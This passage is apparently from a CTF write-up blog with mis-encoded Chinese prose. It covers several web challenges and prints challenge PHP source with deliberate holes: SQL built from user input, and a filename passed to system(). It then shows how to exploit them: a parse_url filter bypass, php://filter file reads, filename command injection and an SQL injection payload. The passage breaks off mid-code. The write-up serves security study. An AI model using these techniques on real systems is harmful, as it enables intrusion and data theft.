class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¸»è¦çš„æºç å°±æ˜¯user.phpå’Œfunction.php<br>åœ¨function.phpé‡Œå‘ç°</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>]<span class="hljs-comment">;</span><br>    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>])<span class="hljs-comment">;</span><br>    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>æ— æ³•ç›´æ¥è¯»åˆ°flagæ–‡ä»¶ï¼Œè¿™é‡Œç”¨parse_urlè§£ææ¼æ´ç»•è¿‡ã€‚<br><strong>parse_url:</strong><br>æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚ æœ¬å‡½æ•°ä¸æ˜¯ç”¨æ¥éªŒè¯ç»™å®š URL çš„åˆæ³•æ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¸å®Œæ•´çš„ URL ä¹Ÿè¢«æ¥å—ï¼Œparse_url() ä¼šå°è¯•å°½é‡æ­£ç¡®åœ°å°†å…¶è§£æã€‚<br>æœ¬åœ°æµ‹è¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><br><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span> [<span class="hljs-string">&quot;host&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;127.0.0.1&quot;</span> [<span class="hljs-string">&quot;path&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/user.php&quot;</span> [<span class="hljs-string">&quot;query&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">57</span>) <span class="hljs-string">&quot;page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>


<p>å†çœ‹çœ‹<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>çš„è¿”å›å€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];<br><br>/user.php?page=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=ffffllllaaaaggg</span><br></code></pre></td></tr></table></figure>


<p>é¢˜ç›®æºç çš„æ„æ€æ˜¯å¯¹<code>$_SERVER[â€˜REQUEST_URIâ€™]</code>è¿›è¡Œparse_urlè§£æã€‚<br><img src="/images/e253a54ba969d9510e831dc0985269b6.png" srcset="/img/loading.gif" lazyload><br>ç”¨ä¼ªåè®®ç›´æ¥è¯»ffffllllaaaagggä¼šè¢«æ£€æµ‹åˆ°</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">$keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<br><span class="hljs-regexp">//</span>    var_dump($query);<br><span class="hljs-regexp">//</span>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">foreach</span>($keywords as $token)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>($query as $k =&gt; $v)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr($k, $token))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr($v, $token))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æœ‰ä¸€ä¸ªåŠæ³•æ˜¯ä½¿parse_urlè§£æå‡ºé”™ï¼Œä»è€Œæ— æ³•è¿›å…¥ä¸‹é¢çš„foreachåˆ¤æ–­ã€‚<br>åªè¦åœ¨user.phpå‰é¢åŠ ä¸Šä¸‰ä¸ª&#x2F;</p>
<p><img src="/images/2973B6CF70324a258FE7FD227DC1A35B.png" srcset="/img/loading.gif" lazyload></p>
<p>ffffllllaaaaggg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>åœ¨è¯»m4aaannngggeee</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å»è¿™ä¸ªé“¾æ¥çœ‹çœ‹<br><img src="/images/2A1010BA98024b33AA28831B71F81080.png" srcset="/img/loading.gif" lazyload><br>æœ‰ä¸ªä¸Šä¼ æŒ‰é’®ï¼Œä½†è²Œä¼¼å¹¶ä¸èƒ½ä¸Šä¼ <br>æºç æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¯»ä¸€ä¸‹è¿™ä¸ª</p>
<p>upllloadddd.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è®¿é—®m4aaannngggeeeé¡µé¢<br><img src="/images/516956C364B64a929CD329C49436D794.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ å€’æ˜¯èƒ½ç”¨</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ª</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">$picdata = <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>filenameæ˜¯æ–‡ä»¶åï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶æ—¶æŠ“åŒ…ï¼Œæ–‡ä»¶ååšä¸ªæ–‡ç« <br><img src="/images/F7C02DB11BB84f87B47DCB73E333AE6D.png" srcset="/img/loading.gif" lazyload><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨ä¸äº†&#x2F;ï¼Œä¹Ÿæ²¡çœ‹åˆ°è¿‡æ»¤å•Š<br>ç”¨cdæ›¿ä»£<br><img src="/images/E37CF01B59844c219711908A71008C97.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/9693C5456E5049c3B32227886A79A074.png" srcset="/img/loading.gif" lazyload><br>åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜<br>åˆ†å·é—­åˆï¼Œ#æ³¨é‡Šåé¢çš„è¯­å¥</p>
<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p><img src="/images/FE67EA5EF43342f3B28D20C240B38382.png" srcset="/img/loading.gif" lazyload><br>å…ˆè¾“å…¥ä¸€ä¸ª1<br><img src="/images/65E02426E997405093F09FDF3622E9BD.png" srcset="/img/loading.gif" lazyload><br>å•å¼•å·é—­åˆä¸‹<br>é¡µé¢ç©ºç™½ï¼Œçœ‹æ¥æ˜¯è¿‡æ»¤äº†<br>é€šè¿‡åæ–œæ æŠ¥é”™å‘ç°ç¡®å®æ˜¯å•å¼•å·é—­åˆ<br>è¿™é‡Œè¦ä¸Šä¸‡èƒ½å¯†ç <br>ç»è¿‡è¯•é”™å¯çŸ¥orè¢«ç¦ç”¨äº†ï¼Œç”¨||ä»£æ›¿ï¼Œlimit0ï¼Œ1ï¼Œè¿”å›ä¸€è¡Œæ•°æ®</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>||<span class="hljs-number">1</span>=<span class="hljs-number">1</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>è·å¾—flagï¼Œçœ‹æ¥æ˜¯ç™»å½•å°±ç»™flag</p>
<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p><img src="/images/5B385211AF574b8f877C1A0B0C5C527D.png" srcset="/img/loading.gif" lazyload><br>é¢˜ç›®ç»™çš„æ˜¯sqlç±»å‹ï¼Œä½†æˆ‘ä»¬è¦æœ‰è‡ªå·±çš„æƒ³æ³•ï¼Œåƒè¿™æ ·çš„ç™»å½•çª—å£ï¼Œè¿˜å¯èƒ½æœ‰å¼±å¯†ç <br>æœ¬é¢˜å¯ä»¥æŒ¨ä¸ªçˆ†uname&#x3D;admin,passwd&#x3D;password<br>ä¼ äº†å‡ ä¸ªæ–‡ä»¶ï¼Œæ²¡æœ‰å¯¹åç¼€è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯ä¸Šä¼ è¿‡åéƒ½å˜ä¸ºäº†.txtæ–‡ä»¶<br>çœ‹çœ‹url</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">home.php?<span class="hljs-attribute">file</span>=upload<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„æ ¼å¼æ„Ÿè§‰æœ‰æ–‡ä»¶åŒ…å«<br>ä¼ªåè®®æµ‹ä¸€ä¸‹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">home.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=upload<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸåˆ©ç”¨ï¼Œå¾—åˆ°äº†upload.phpçš„æºç </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">	ä¸Šä¼ æ–‡ä»¶</span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ã¤Â¸ÂŠÃ¤Â¼Â &quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;</span><br><span class="language-php">	</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;</span><br><span class="language-php">		<span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;</span><br><span class="language-php">		@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-variable">$this</span>-&gt;Filename))&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span 